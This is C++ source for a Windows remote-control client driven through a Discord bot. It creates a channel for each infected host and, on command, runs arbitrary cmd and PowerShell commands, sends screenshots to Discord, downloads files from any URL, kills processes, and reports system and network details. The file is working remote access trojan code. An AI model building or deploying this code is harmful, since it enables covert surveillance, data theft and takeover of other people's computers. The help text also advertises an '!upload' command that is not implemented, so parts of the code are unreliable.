#include "remote.h"
#include <dpp/dpp.h>
#include <windows.h>
#include <iostream>
#include <set>
#include <string>
#include <unordered_map>
#include <fstream>
#include <map>
#include <sstream>
#include <vector>
#include <filesystem>
#include <thread>
#include <chrono>
#include <tlhelp32.h>
#include <psapi.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <winreg.h>

#include <gdiplus.h>
#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "urlmon.lib")

const std::string BOT_TOKEN = "fsoc";
const uint64_t GUILD_ID = 1;
const uint64_t AUTHORIZED_USER_ID = 1;

const std::set<std::string> ALLOWED_COMMANDS = {
    "whoami",
    "hostname",
    "list-drives",
    "get-uptime",
    "run-notepad",
    "processes",
    "sysinfo",
    "netinfo",
    "tasklist"
};

static std::string get_hostname() {
    char buf[256];
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size)) return std::string(buf);
    return "unknown-host";
}

static std::string get_uptime() {
    ULONGLONG ms = GetTickCount64();
    ULONGLONG s = ms / 1000;
    ULONGLONG h = s / 3600;
    ULONGLONG m = (s % 3600) / 60;
    ULONGLONG sec = s % 60;
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "%lluh %llum %llus", h, m, sec);
    return std::string(tmp);
}

static std::string get_system_info() {
    std::string info = "=== SYSTEM INFO ===\n";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD bufferSize = sizeof(buffer);
        if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            info += "OS: " + std::string(buffer) + "\n";
        }
        bufferSize = sizeof(buffer);
        if (RegQueryValueExA(hKey, "CurrentBuild", nullptr, nullptr, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            info += "Build: " + std::string(buffer) + "\n";
        }
        RegCloseKey(hKey);
    }

    MEMORYSTATUSEX statex = {};
    statex.dwLength = sizeof(statex);
    if (GlobalMemoryStatusEx(&statex)) {
        info += "Total RAM: " + std::to_string(statex.ullTotalPhys / (1024 * 1024)) + " MB\n";
        info += "Available RAM: " + std::to_string(statex.ullAvailPhys / (1024 * 1024)) + " MB\n";
        info += "Memory Load: " + std::to_string(statex.dwMemoryLoad) + "%\n";
    }

    SYSTEM_INFO si = {};
    GetSystemInfo(&si);
    info += "CPU Cores: " + std::to_string(si.dwNumberOfProcessors) + "\n";
    info += "CPU Architecture: " + std::to_string(si.wProcessorArchitecture) + "\n";

    return info;
}

static std::string get_network_info() {
    std::string info = "=== NETWORK INFO ===\n";

    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    ULONG ulOutBufLen = 0;

    if (GetAdaptersInfo(nullptr, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            int adapterNum = 1;
            while (pAdapter) {
                info += "Adapter " + std::to_string(adapterNum) + ": " + pAdapter->Description + "\n";
                info += "  MAC: " + std::string(pAdapter->AdapterName) + "\n";
                info += "  IP: " + std::string(pAdapter->IpAddressList.IpAddress.String) + "\n";
                info += "  Gateway: " + std::string(pAdapter->GatewayList.IpAddress.String) + "\n\n";
                pAdapter = pAdapter->Next;
                adapterNum++;
            }
        }
        free(pAdapterInfo);
    }

    return info;
}

static std::string get_process_list() {
    std::string result = "=== RUNNING PROCESSES ===\n";
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return "Failed to get process list";
    }

    PROCESSENTRY32W pe32 = {};
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            std::wstring wProcessName(pe32.szExeFile);
            std::string processName(wProcessName.begin(), wProcessName.end());

            result += "PID: " + std::to_string(pe32.th32ProcessID) +
                " | " + processName + "\n";
        } while (Process32NextW(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return result;
}

static std::string kill_process(const std::string & processName) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return "Failed to get process list";
    }

    PROCESSENTRY32W pe32 = {};
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    bool found = false;

    std::wstring wProcessName(processName.begin(), processName.end());

    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, wProcessName.c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    if (TerminateProcess(hProcess, 0)) {
                        CloseHandle(hProcess);
                        found = true;
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return found ? "Process " + processName + " terminated" : "Process " + processName + " not found";
}

static bool take_screenshot(const std::string & filename) {
    using namespace Gdiplus;

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap);

    bool success = BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    if (success) {
        Bitmap* bitmap = new Bitmap(hBitmap, NULL);

        CLSID pngClsid;
        CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid);

        std::wstring wfilename(filename.begin(), filename.end());

        Status stat = bitmap->Save(wfilename.c_str(), &pngClsid, NULL);
        success = (stat == Ok);

        delete bitmap;
    }

    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return success;
}

static std::string run_allowed_command(const std::string & cmd) {
    if (cmd == "whoami") {
        char name[256];
        DWORD size = sizeof(name);
        return GetUserNameA(name, &size) ? std::string(name) : "unknown-user";
    }
    if (cmd == "hostname") return get_hostname();
    if (cmd == "get-uptime") return get_uptime();
    if (cmd == "sysinfo") return get_system_info();
    if (cmd == "netinfo") return get_network_info();
    if (cmd == "processes" || cmd == "tasklist") return get_process_list();

    if (cmd == "list-drives") {
        std::string out;
        DWORD mask = GetLogicalDrives();
        for (int i = 0; i < 26; ++i) {
            if (mask & (1 << i)) {
                char drive = 'A' + i;
                out += drive;
                out += ":\\\n";

                std::string drivePath = std::string(1, drive) + ":\\";
                ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes;
                if (GetDiskFreeSpaceExA(drivePath.c_str(), &freeBytesAvailable, &totalNumberOfBytes, NULL)) {
                    out += "  Total: " + std::to_string(totalNumberOfBytes.QuadPart / (1024 * 1024 * 1024)) + " GB\n";
                    out += "  Free: " + std::to_string(freeBytesAvailable.QuadPart / (1024 * 1024 * 1024)) + " GB\n";
                }
            }
        }
        return out.empty() ? "[no drives]" : out;
    }

    if (cmd == "run-notepad") {
        STARTUPINFOA si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);
        if (CreateProcessA(nullptr, const_cast<char*>("notepad.exe"), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return "notepad started";
        }
        return "failed to start notepad";
    }
    return "unknown-command";
}

void RemoteClient::start() {
    if (BOT_TOKEN.empty() || GUILD_ID == 0 || AUTHORIZED_USER_ID == 0)
        throw std::runtime_error("BOT_TOKEN, GUILD_ID or AUTHORIZED_USER_ID not set");

    dpp::cluster bot(BOT_TOKEN, dpp::i_default_intents | dpp::i_message_content);

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    std::string hostname = get_hostname();
    std::transform(hostname.begin(), hostname.end(), hostname.begin(), ::tolower);
    std::string channel_name = "pc-" + hostname;
    uint64_t bot_channel_id = 0;
    bool channel_ready = false;

    std::unordered_map<uint64_t, std::string> user_current_dirs;

    auto setup_channel = [&bot, &bot_channel_id, &channel_ready, channel_name]() {

        bot.channels_get(GUILD_ID, [&bot, &bot_channel_id, &channel_ready, channel_name](const dpp::confirmation_callback_t& cc) {
            if (cc.is_error()) {
                return;
            }

            try {
                auto chmap = std::get<dpp::channel_map>(cc.value);
                bool found = false;

                for (const auto& kv : chmap) {

                    std::string existing_name = kv.second.name;
                    std::transform(existing_name.begin(), existing_name.end(), existing_name.begin(), ::tolower);
                    std::string search_name = channel_name;
                    std::transform(search_name.begin(), search_name.end(), search_name.begin(), ::tolower);

                    if (existing_name == search_name && kv.second.get_type() == dpp::CHANNEL_TEXT) {
                        bot_channel_id = kv.second.id;
                        found = true;
                        break;
                    }
                }

                if (!found) {
                    dpp::channel newc;
                    newc.set_name(channel_name);
                    newc.set_guild_id(GUILD_ID);
                    newc.set_type(dpp::CHANNEL_TEXT);

                    bot.channel_create(newc, [&bot_channel_id, &channel_ready, channel_name](const dpp::confirmation_callback_t& cc2) {
                        if (!cc2.is_error()) {
                            bot_channel_id = std::get<dpp::channel>(cc2.value).id;
                            channel_ready = true;
                        }
                        else {
                        }
                        });
                }
                else {
                    channel_ready = true;
                }
            }
            catch (const std::exception& e) {
            }
            });
        };

    bot.on_ready([&setup_channel](const dpp::ready_t& event) {
        setup_channel();
        });

    bot.on_message_create([&bot, &bot_channel_id, &channel_ready, &user_current_dirs](const dpp::message_create_t& mc) {
        if (!channel_ready || bot_channel_id == 0) {
            return;
        }

        if (mc.msg.channel_id != bot_channel_id) {
            return;
        }

        if (mc.msg.author.id != AUTHORIZED_USER_ID) {
            return;
        }

        const std::string& content = mc.msg.content;

        auto& current_dir = user_current_dirs[mc.msg.author.id];
        if (current_dir.empty()) {
            const char* userProfile = getenv("USERPROFILE");
            current_dir = userProfile ? std::string(userProfile) : "C:\\";
        }

        auto send_output = [&bot, &mc](const std::string& result) {
            if (result.empty()) {
                bot.message_create(dpp::message(mc.msg.channel_id, "[no output]"));
                return;
            }

            const size_t MAX_LEN = 1900;
            size_t start = 0;
            while (start < result.size()) {
                size_t len = std::min(MAX_LEN, result.size() - start);
                bot.message_create(dpp::message(mc.msg.channel_id, result.substr(start, len)));
                start += len;
            }
            };

        if (content == "!help") {
            std::string help = "=== REMOTE CONTROL BOT COMMANDS ===\n"
                "**Basic Commands:**\n"
                "• whoami, hostname, get-uptime\n"
                "• list-drives, sysinfo, netinfo\n"
                "• processes/tasklist\n\n"
                "**Advanced Commands:**\n"
                "• !status - Show system status\n"
                "• !cmd <command> - Execute CMD command\n"
                "• !ps <command> - Execute PowerShell command\n"
                "• !ss - Take screenshot\n"
                "• !kill <process.exe> - Kill process\n"
                "• !download <url> <filename> - Download file\n"
                "• !upload <filename> - Upload file to current directory\n"
                "• !ls - List current directory\n"
                "• !pwd - Show current directory\n"
                "• !shutdown - Shutdown bot\n";

            bot.message_create(dpp::message(mc.msg.channel_id, help));
            return;
        }

        if (ALLOWED_COMMANDS.find(content) != ALLOWED_COMMANDS.end()) {
            std::string out = run_allowed_command(content);
            send_output(out);
            return;
        }

        // !status
        if (content == "!status") {
            std::string status = "=== SYSTEM STATUS ===\n";
            status += "Host: " + get_hostname() + "\n";
            status += "User: " + run_allowed_command("whoami") + "\n";
            status += "Uptime: " + get_uptime() + "\n";
            status += "Current dir: " + current_dir + "\n";

            MEMORYSTATUSEX memStatus = {};
            memStatus.dwLength = sizeof(memStatus);
            if (GlobalMemoryStatusEx(&memStatus)) {
                status += "Memory usage: " + std::to_string(memStatus.dwMemoryLoad) + "%\n";
            }

            bot.message_create(dpp::message(mc.msg.channel_id, status));
            return;
        }

        // !pwd - show current directory
        if (content == "!pwd") {
            bot.message_create(dpp::message(mc.msg.channel_id, "Current directory: " + current_dir));
            return;
        }

        // !ls - list directory
        if (content == "!ls") {
            std::string result = "=== DIRECTORY LISTING: " + current_dir + " ===\n";
            try {
                for (const auto& entry : std::filesystem::directory_iterator(current_dir)) {
                    std::string name = entry.path().filename().string();
                    if (entry.is_directory()) {
                        result += "[DIR]  " + name + "\n";
                    }
                    else {
                        auto size = entry.file_size();
                        result += "[FILE] " + name + " (" + std::to_string(size) + " bytes)\n";
                    }
                }
            }
            catch (const std::exception& e) {
                result += "Error: " + std::string(e.what());
            }
            send_output(result);
            return;
        }

        // !kill <process>
        if (content.rfind("!kill ", 0) == 0) {
            std::string processName = content.substr(6);
            if (processName.empty()) {
                bot.message_create(dpp::message(mc.msg.channel_id, "Usage: !kill <process.exe>"));
                return;
            }
            std::string result = kill_process(processName);
            bot.message_create(dpp::message(mc.msg.channel_id, result));
            return;
        }

        // !download <url> <filename>
        if (content.rfind("!download ", 0) == 0) {
            std::string args = content.substr(10);
            size_t spacePos = args.find(' ');
            if (spacePos == std::string::npos) {
                bot.message_create(dpp::message(mc.msg.channel_id, "Usage: !download <url> <filename>"));
                return;
            }

            std::string url = args.substr(0, spacePos);
            std::string filename = args.substr(spacePos + 1);
            std::string fullPath = current_dir + "\\" + filename;

            HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), fullPath.c_str(), 0, NULL);
            if (SUCCEEDED(hr)) {
                bot.message_create(dpp::message(mc.msg.channel_id, "Downloaded: " + filename));
            }
            else {
                bot.message_create(dpp::message(mc.msg.channel_id, "Failed to download file"));
            }
            return;
        }

        // !cmd <command>
        if (content.rfind("!cmd ", 0) == 0) {
            std::string arg = content.substr(5);
            if (arg.empty()) {
                bot.message_create(dpp::message(mc.msg.channel_id, "Usage: !cmd <command>"));
                return;
            }

            // Change directory handling
            if (arg.rfind("cd ", 0) == 0) {
                std::string new_dir = arg.substr(3);
                // Remove quotes if present
                if (new_dir.front() == '"' && new_dir.back() == '"') {
                    new_dir = new_dir.substr(1, new_dir.length() - 2);
                }

                if (std::filesystem::exists(new_dir) && std::filesystem::is_directory(new_dir)) {
                    current_dir = std::filesystem::absolute(new_dir).string();
                    bot.message_create(dpp::message(mc.msg.channel_id, "Directory changed to: " + current_dir));
                }
                else {
                    bot.message_create(dpp::message(mc.msg.channel_id, "Directory does not exist: " + new_dir));
                }
                return;
            }

            std::string cmdline = "cmd /C \"cd /D \"" + current_dir + "\" && " + arg + "\"";

            FILE* pipe = _popen(cmdline.c_str(), "r");
            if (!pipe) {
                bot.message_create(dpp::message(mc.msg.channel_id, "Failed to run CMD command."));
                return;
            }

            char buffer[128];
            std::string result;
            while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
            _pclose(pipe);

            send_output(result);
            return;
        }

        // !ps <powershell command>
        if (content.rfind("!ps ", 0) == 0) {
            std::string arg = content.substr(4);
            if (arg.empty()) {
                bot.message_create(dpp::message(mc.msg.channel_id, "Usage: !ps <command>"));
                return;
            }

            std::string cmdline = "powershell -Command \"Set-Location '" + current_dir + "'; " + arg + "\"";
            FILE* pipe = _popen(cmdline.c_str(), "r");
            if (!pipe) {
                bot.message_create(dpp::message(mc.msg.channel_id, "Failed to run PowerShell command."));
                return;
            }

            char buffer[128];
            std::string result;
            while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
            _pclose(pipe);

            send_output(result);
            return;
        }

        // !ss - Enhanced screenshot
        if (content == "!ss") {
            std::string filename = "screenshot_" + std::to_string(GetTickCount64()) + ".png";
            std::string fullPath = current_dir + "\\" + filename;

            if (take_screenshot(fullPath)) {
                try {
                    // Read file and send as attachment
                    std::ifstream file(fullPath, std::ios::binary);
                    if (file.good()) {
                        std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(file)),
                            std::istreambuf_iterator<char>());
                        file.close();

                        dpp::message msg(mc.msg.channel_id, "Screenshot captured:");
                        msg.add_file(filename, std::string(buffer.begin(), buffer.end()));
                        bot.message_create(msg);

                        // Cleanup
                        std::filesystem::remove(fullPath);
                    }
                    else {
                        bot.message_create(dpp::message(mc.msg.channel_id, "Failed to read screenshot file."));
                    }
                }
                catch (const std::exception& e) {
                    bot.message_create(dpp::message(mc.msg.channel_id, "Error sending screenshot: " + std::string(e.what())));
                }
            }
            else {
                bot.message_create(dpp::message(mc.msg.channel_id, "Failed to capture screenshot."));
            }
            return;
        }

        // !shutdown
        if (content == "!shutdown") {
            bot.message_create(dpp::message(mc.msg.channel_id, "Shutting down remote client..."));
            std::this_thread::sleep_for(std::chrono::seconds(2));
            ExitProcess(0);
        }
        });

    bot.start(dpp::st_wait);
    Gdiplus::GdiplusShutdown(gdiplusToken);
}
